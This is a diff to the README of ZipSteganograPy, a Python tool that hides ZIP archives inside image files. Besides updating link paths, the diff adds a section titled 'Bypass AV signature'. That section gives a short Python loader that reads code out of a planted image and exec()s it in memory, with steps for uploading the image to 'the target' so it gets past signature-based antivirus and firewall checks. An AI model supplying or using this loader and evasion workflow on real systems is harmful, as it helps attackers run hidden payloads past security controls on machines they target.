@@ -1,4 +1,5 @@
-![ZipSteganograPy logo](https://mauricelambert.github.io/info/python/security/ZipSteganograPy_small.png "ZipSteganograPy logo")
+![ZipSteganograPy logo](https://mauricelambert.github.io/info/python/code/ZipSteganograPy_small.png "ZipSteganograPy logo")
+
 # ZipSteganograPy
 
 ## Description
@@ -40,12 +41,53 @@ unzip stegano.jpg -l                         # list files
 unzip stegano.jpg -d output/                 # extract
 ```
 
+### Bypass AV signature
+
+This example load a python code from an image and execute it without writing it on the disk.
+
+This method bypass:
+[x] basic anti-virus analyze based on signatures of files written on the disk
+[ ] behavior module
+[ ] process memory analyze
+
+```python
+from zipfile import ZipFile
+with ZipFile("stegano.png", "r") as f:
+    for filename in f.namelist():
+        exec(f.read(filename).decode())
+```
+
+#### Demonstration
+
+On your computer:
+
+```sh
+ZipSteganograPy -f hello.py -i ZipSteganograPy_small.png
+# ZipSteganograPy  Copyright (C) 2022  Maurice Lambert
+# This program comes with ABSOLUTELY NO WARRANTY.
+# This is free software, and you are welcome to redistribute it
+# under certain conditions.
+
+# New image 'stegano.png' created from 'ZipSteganograPy_small.png' with hidden ZIP archive.
+```
+
+Upload the `stegano.png` file on the target (the zip file will probably not anlyze by firewalls because the file will be detected as a correct image).
+
+On the target (unzip from image and execute your python code without writing it on the disk):
+
+```python
+from zipfile import ZipFile
+with ZipFile("stegano.png", "r") as f:
+    for filename in f.namelist():
+        exec(f.read(filename).decode())
+```
+
 ## Links
 
  - [Github Page](https://github.com/mauricelambert/ZipSteganograPy/)
  - [Pypi package](https://pypi.org/project/ZipSteganograPy/)
- - [Documentation](https://mauricelambert.github.io/info/python/security/ZipSteganograPy.html)
- - [Python Executable](https://mauricelambert.github.io/info/python/security/ZipSteganograPy.pyz)
+ - [Documentation](https://mauricelambert.github.io/info/python/code/ZipSteganograPy.html)
+ - [Python Executable](https://mauricelambert.github.io/info/python/code/ZipSteganograPy.pyz)
 
 ## Licence
 
